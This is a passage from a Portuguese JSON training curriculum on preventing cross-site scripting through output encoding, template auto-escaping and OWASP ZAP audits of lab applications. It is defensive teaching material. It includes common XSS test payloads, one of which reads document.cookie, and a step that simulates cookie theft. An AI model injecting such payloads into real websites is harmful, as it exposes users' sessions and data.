                                  "materials": [
                                    "Node.js com Express",
                                    "Biblioteca 'jsesc' ou JSON nativo",
                                    "Console browser para testar eval"
                                  ],
                                  "tips": "JSON.stringify é seguro para JS strings; evite eval sempre que possível.",
                                  "learningObjective": "Escapar dados em contextos JS para prevenir code injection.",
                                  "commonMistakes": [
                                    "Concatenação direta de strings em JS",
                                    "Usar escape HTML para JS",
                                    "Ignorar JSON contexts"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar encoders em um framework web (React/Express)",
                                  "subSteps": [
                                    "Crie um app React com form que envia query URL encoded e renderiza HTML escaped.",
                                    "No backend Express, receba params, escape para JSON response.",
                                    "Adicione testes unitários com Jest para cada encoder.",
                                    "Simule ataques full-stack e verifique falhas.",
                                    "Refatore para um hook/util reutilizável."
                                  ],
                                  "verification": "App completo resiste a testes XSS automatizados (ex: XSStrike).",
                                  "estimatedTime": "60 min",
                                  "materials": [
                                    "Create React App",
                                    "Express generator",
                                    "Jest para testes",
                                    "Postman para API tests"
                                  ],
                                  "tips": "Centralize encoders em utils para consistência.",
                                  "learningObjective": "Aplicar múltiplos encoders em fluxo full-stack.",
                                  "commonMistakes": [
                                    "Encoder inconsistente entre client/server",
                                    "Bypass via API direta",
                                    "Falta de testes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app React de busca: const query = encodeURIComponent(userInput); <a href={`https://api.example.com/search?q=${query}`}>Buscar</a>. Para exibir resultados: <div dangerouslySetInnerHTML={{__html: he.encode(serverData)}} />. No Express backend: res.json({data: JSON.stringify(escapeForJS(userData))});. Teste input '<script>alert(\"XSS\")</script>' – deve aparecer como texto.",
                              "finalVerifications": [
                                "Gere URLs válidas com encodeURIComponent sem quebrar queries.",
                                "Renderize HTML com entities sem executar scripts.",
                                "Insira strings JS escapadas sem injeções via eval.",
                                "App React/Express resiste a 10+ payloads XSS comuns.",
                                "Testes unitários passam com 100% coverage para encoders.",
                                "Tabela de contextos/encoders correta e completa."
                              ],
                              "assessmentCriteria": [
                                "Uso correto de encoder por contexto (sem mismatches).",
                                "Código limpo, com funções wrapper e reutilizáveis.",
                                "Resistência comprovada a ataques via testes manuais/automáticos.",
                                "Integração seamless em React/Express sem side-effects.",
                                "Documentação inline explicando escolhas de encoders.",
                                "Eficiência: tempo de execução < 1ms por encode."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Prevenção de XSS (OWASP Top 10).",
                                "Desenvolvimento Web: Frameworks React/Express best practices.",
                                "Programação: Manipulação segura de strings e UTF-8.",
                                "Testes de Software: Unit/integration tests para segurança.",
                                "Redes: Encoding em HTTP protocols."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon ou redes sociais como Twitter, encoders contextuais previnem XSS em user-generated content (perfis, comentários, links), protegendo milhões de usuários e evitando breaches como o de 2018 no British Airways (£20M multa GDPR)."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.2.3",
                            "name": "Integrar codificação em templates e respostas",
                            "description": "Usar bibliotecas seguras como OWASP ESAPI ou auto-escaping em templates (ex.: Twig no PHP, Jinja no Python) para codificar saídas automaticamente em aplicações web dinâmicas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Conceitos de Codificação de Saída e Auto-Escaping",
                                  "subSteps": [
                                    "Estude o que é codificação de saída (output encoding) e por que ela previne XSS.",
                                    "Aprenda sobre contextos de codificação: HTML, JS, CSS, URL.",
                                    "Pesquise bibliotecas como OWASP ESAPI, Jinja (Python) e Twig (PHP) e seus mecanismos de auto-escaping.",
                                    "Compare manual vs. automático escaping, focando em benefícios de automação.",
                                    "Identifique cenários onde auto-escaping é ativado por padrão."
                                  ],
                                  "verification": "Resuma em um documento os 3 principais benefícios do auto-escaping e liste 2 exemplos de contextos de codificação.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação OWASP XSS Prevention Cheat Sheet, docs de Jinja2 e Twig, navegador para testes iniciais.",
                                  "tips": "Use diagramas para visualizar fluxo de dados de entrada para saída renderizada.",
                                  "learningObjective": "Compreender os fundamentos teóricos da codificação de saída para prevenir injeções maliciosas.",
                                  "commonMistakes": "Confundir escaping de entrada com saída; ignorar contextos específicos como atributos HTML."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente com Template Engine Seguro",
                                  "subSteps": [
                                    "Instale um framework com suporte nativo: Flask (Python+Jinja) ou Slim (PHP+Twig).",
                                    "Configure o template engine para ativar auto-escaping globalmente.",
                                    "Crie um template básico que renderize dados de usuário (ex: nome e mensagem).",
                                    "Teste renderização sem escaping para observar vulnerabilidade XSS.",
                                    "Ative e verifique auto-escaping com payload de teste como '<script>alert(1)</script>'."
                                  ],
                                  "verification": "Execute o app e confirme que payloads maliciosos são escapados no HTML gerado (inspecione fonte).",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Python/PHP instalado, pip/composer para dependências, VS Code ou IDE similar, payloads XSS de teste do OWASP.",
                                  "tips": "Comece com Python Flask por simplicidade: flask run e acesse localhost.",
                                  "learningObjective": "Configurar corretamente um template engine com auto-escaping ativado por padrão.",
                                  "commonMistakes": "Esquecer de instalar extensões; desabilitar acidentalmente auto-escaping em templates."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Codificação em Templates e Respostas Dinâmicas",
                                  "subSteps": [
                                    "Modifique templates para incluir variáveis dinâmicas em diferentes contextos (HTML body, attributes, JS).",
                                    "Implemente respostas JSON/API com escaping manual se necessário (ex: ESAPI.encodeForJavaScript).",
                                    "Adicione lógica no backend para passar dados limpos para templates.",
                                    "Use filtros específicos do template engine para contextos avançados (ex: |e('js') no Twig).",
                                    "Refatore código existente para substituir escaping manual por auto-escaping."
                                  ],
                                  "verification": "Renderize múltiplos cenários e valide que todos os outputs estão corretamente escapados via inspeção ou ferramenta como Burp Suite.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Código base de app web simples, documentação de filtros Twig/Jinja, payloads XSS variados.",
                                  "tips": "Sempre especifique contexto no filtro para precisão: Jinja usa |e('html_attr').",
                                  "learningObjective": "Aplicar codificação automática em templates e respostas para apps web dinâmicas.",
                                  "commonMistakes": "Não escapar em contextos JS/CSS; confiar apenas em auto-escaping sem testar."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Validar e Documentar a Implementação",
                                  "subSteps": [
                                    "Crie testes unitários/funcionais com inputs maliciosos e valide saídas escapadas.",
                                    "Use scanners automatizados como OWASP ZAP para detectar XSS remanescentes.",
                                    "Documente configurações no README e adicione comentários no código.",
                                    "Simule ataques reais e confirme mitigações.",
                                    "Otimize performance monitorando overhead do escaping."
                                  ],
                                  "verification": "Todos os testes passam e nenhum alerta XSS em scanner; documentação cobre setup e uso.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "OWASP ZAP ou similar, pytest (Python) ou PHPUnit (PHP), payloads do XSStrike.",
                                  "tips": "Automatize testes em CI/CD para verificação contínua.",
                                  "learningObjective": "Garantir robustez da implementação através de testes e documentação.",
                                  "commonMistakes": "Testar apenas com payloads simples; negligenciar performance em loops."
                                }
                              ],
                              "practicalExample": "Em um app Flask (Python), crie uma rota /post/<user_id> que renderiza template user_profile.html com dados de usuário. Sem escaping: {{ user.bio }} permite XSS. Com Jinja auto-escaping: bio é renderizado como &lt;script&gt;alert(1)&lt;/script&gt;. Similar no Twig PHP: {{ user.bio|raw }} desabilita (evite), {{ user.bio }} escapa automaticamente.",
                              "finalVerifications": [
                                "Templates renderizam inputs maliciosos como texto escapado no HTML fonte.",
                                "Nenhum alerta XSS em scans automatizados como ZAP.",
                                "Testes unitários cobrem 100% dos cenários de output dinâmico.",
                                "Configurações de auto-escaping estão documentadas e ativadas globalmente.",
                                "Performance não degradou >10% com escaping ativado.",
                                "Filtros de contexto específico funcionam para JS/CSS/URL."
                              ],
                              "assessmentCriteria": [
                                "Código usa exclusivamente auto-escaping sem manual overriding desnecessário.",
                                "Cobertura de testes >80% para outputs dinâmicos.",
                                "Mitigação comprovada contra top 5 payloads XSS OWASP.",
                                "Documentação clara para setup e troubleshooting.",
                                "Integração seamless em app existente sem quebrar funcionalidades.",
                                "Conhecimento demonstrado de contextos de escaping variados."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Alinhado com OWASP Top 10 (A7: XSS).",
                                "Desenvolvimento Web: Integra com MVC patterns em Flask/Symfony.",
                                "Testes de Software: Ênfase em TDD e security testing.",
                                "Performance e Otimização: Análise de overhead em rendering."
                              ],
                              "realWorldApplication": "Em plataformas como WordPress plugins ou e-commerces (ex: Shopify apps), integra codificação em templates de comentários/produtos para prevenir XSS em milhões de usuários, evitando breaches como o de 2019 no Magento onde escaping falhou."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.2.4",
                            "name": "Auditar e testar contra XSS",
                            "description": "Realizar scans com ferramentas como OWASP ZAP para detectar falhas de codificação de saída e validar correções em diferentes navegadores e contextos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar OWASP ZAP",
                                  "subSteps": [
                                    "Baixar a versão mais recente do OWASP ZAP do site oficial.",
                                    "Instalar o ZAP seguindo as instruções para o sistema operacional (Windows, Linux ou macOS).",
                                    "Configurar o navegador para usar o proxy do ZAP (geralmente localhost:8080).",
                                    "Instalar o certificado raiz do ZAP no navegador para interceptar tráfego HTTPS.",
                                    "Iniciar o ZAP e explorar a interface principal (HUD, Sites, Alerts)."
                                  ],
                                  "verification": "O ZAP inicia sem erros, o proxy está ativo e o navegador roteia tráfego através dele, confirmado por logs no ZAP.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Download do OWASP ZAP (https://www.zaproxy.org/download/)",
                                    "Navegador web (Chrome ou Firefox)",
                                    "Aplicação vulnerável como DVWA ou bWAPP"
                                  ],
                                  "tips": "Ative o modo HUD para testes mais intuitivos em aplicações locais.",
                                  "learningObjective": "Configurar um ambiente de teste seguro com OWASP ZAP para auditoria de aplicações web.",
                                  "commonMistakes": [
                                    "Falhar em instalar o certificado SSL, causando erros de conexão HTTPS.",
                                    "Usar porta errada no proxy (padrão é 8080).",
                                    "Ignorar atualizações de plugins no ZAP."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar e Configurar a Aplicação Alvo",
                                  "subSteps": [
                                    "Escolher ou configurar uma aplicação vulnerável (ex: DVWA com XSS habilitado).",
                                    "Iniciar a aplicação localmente (ex: via XAMPP ou Docker).",
                                    "Mapear o site no ZAP usando o Spider ou Manual Explore.",
                                    "Identificar pontos de entrada potenciais para XSS (formulários, parâmetros URL, campos de texto).",
                                    "Configurar contexto no ZAP para o site alvo (add context, include in scope)."
                                  ],
                                  "verification": "O site é spidered no ZAP sem erros e pontos de entrada são listados no painel Sites.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "DVWA ou bWAPP baixado e configurado",
                                    "Servidor local (XAMPP, WAMP ou Docker)",
                                    "OWASP ZAP aberto"
                                  ],
                                  "tips": "Use aplicações de teste conhecidas para evitar riscos em produção.",
                                  "learningObjective": "Preparar um ambiente controlado para simular ataques XSS reais.",
                                  "commonMistakes": [
                                    "Não habilitar módulos vulneráveis no DVWA (ex: low security).",
                                    "Esquecer de incluir o site no scope do ZAP.",
                                    "Testar em produção acidentalmente."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Scans Automatizados e Identificar Vulnerabilidades XSS",
                                  "subSteps": [
                                    "Executar Active Scan no contexto do site alvo.",
                                    "Executar Passive Scan durante a navegação.",
                                    "Analisar alerts no ZAP filtrados por XSS (reflected, stored, DOM-based).",
                                    "Reproduzir vulnerabilidades manualmente injetando payloads como <script>alert('XSS')</script>.",
                                    "Documentar evidências com screenshots e requests/responses do History tab."
                                  ],
                                  "verification": "Alerts de XSS são gerados e reproduzidos com sucesso, com pelo menos 2-3 vulnerabilidades identificadas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "OWASP ZAP com scans configurados",
                                    "Payloads XSS comuns (OWASP XSS Filter Evasion Cheat Sheet)",
                                    "Ferramenta de screenshot"
                                  ],
                                  "tips": "Aumente o scan policy para 'Attack Strength: High' após testes iniciais.",
                                  "learningObjective": "Detectar falhas de codificação de saída usando scans automatizados.",
                                  "commonMistakes": [
                                    "Confundir falsos positivos com reais (verificar reprodução manual).",
                                    "Não salvar sessão do ZAP para relatórios.",
                                    "Ignorar DOM-based XSS."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Correções e Validar em Múltiplos Navegadores",
                                  "subSteps": [
                                    "Implementar correções: usar encoding de saída (ex: htmlspecialchars em PHP, innerText em JS).",
                                    "Re-escanear a aplicação corrigida com ZAP.",
                                    "Testar manualmente em Chrome, Firefox e Safari com payloads variados.",
                                    "Verificar contextos diferentes: HTML, JS, URL, CSS, atributos.",
                                    "Gerar relatório final no ZAP (HTML report)."
                                  ],
                                  "verification": "Zero alerts de XSS no scan final e payloads não executam em todos os navegadores testados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Código fonte da aplicação editável",
                                    "Múltiplos navegadores instalados",
                                    "OWASP ZAP para re-scan"
                                  ],
                                  "tips": "Teste payloads contextuais (ex: javascript:alert() para href).",
                                  "learningObjective": "Validar efetividade de correções contra XSS em cenários reais.",
                                  "commonMistakes": [
                                    "Encoding incompleto (ex: só em echo, não em variáveis).",
                                    "Testar só em um navegador (comportamentos variam).",
                                    "Não testar stored XSS."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar e Revisar o Processo de Auditoria",
                                  "subSteps": [
                                    "Compilar relatório com vulnerabilidades encontradas, correções e evidências.",
                                    "Revisar logs do ZAP para lições aprendidas.",
                                    "Simular ataque em contexto real-world (ex: payload roubando cookies).",
                                    "Atualizar scan rules no ZAP com customizações se necessário.",
                                    "Compartilhar relatório em formato seguro."
                                  ],
                                  "verification": "Relatório completo gerado e revisado, cobrindo todas as vulnerabilidades e correções.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Template de relatório de segurança",
                                    "Ferramentas de edição (Markdown ou Word)"
                                  ],
                                  "tips": "Use o relatório gerado pelo ZAP como base e adicione screenshots personalizados.",
                                  "learningObjective": "Consolidar conhecimentos em auditoria XSS através de documentação profissional.",
                                  "commonMistakes": [
                                    "Relatório vago sem evidências reprodutíveis.",
                                    "Omitir recomendações preventivas como CSP."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um formulário de comentários de um blog PHP vulnerável, injetar <script>alert(document.cookie)</script> reflete sem encoding. Após correção com htmlspecialchars($input, ENT_QUOTES, 'UTF-8'), retestar em Chrome/Firefox mostra texto escapado sem execução.",
                              "finalVerifications": [
                                "Scan final do ZAP reporta zero riscos de XSS.",
                                "Testes manuais com 10+ payloads variados falham em 3 navegadores.",
                                "Nenhum script malicioso executa em contextos HTML/JS/URL.",
                                "Relatório documenta todas as falhas iniciais e correções.",
                                "Cookies/sessões não são acessíveis via XSS simulado."
                              ],
                              "assessmentCriteria": [
                                "Uso correto de Active/Passive Scans no ZAP (cobertura >90%).",
                                "Identificação precisa de tipos de XSS (reflected/stored/DOM).",
                                "Correções implementadas seguem OWASP guidelines (ex: encoding contextual).",
                                "Validação em múltiplos navegadores e contextos documentada.",
                                "Relatório claro com evidências e métricas de risco."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Integração com HTML/JS e encoding em linguagens como PHP/Node.js.",
                                "Redes e Sistemas: Entendimento de proxies e interceptação de tráfego HTTP.",
                                "Ética e Governança: Conformidade com LGPD/GDPR em proteção de dados.",
                                "Testes de Software: Práticas de QA e automação de testes de segurança.",
                                "Análise de Dados: Interpretação de logs e relatórios de vulnerabilidades."
                              ],
                              "realWorldApplication": "Em empresas como bancos ou e-commerces, auditores usam ZAP para testar apps web antes do lançamento, prevenindo breaches como o ataque XSS no Twitter (2010) que comprometeu contas, economizando milhões em perdas e multas regulatórias."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              }
            ],
            "totalSkills": 229
          }
        ],
        "totalSkills": 229
      }
    ]
  }
}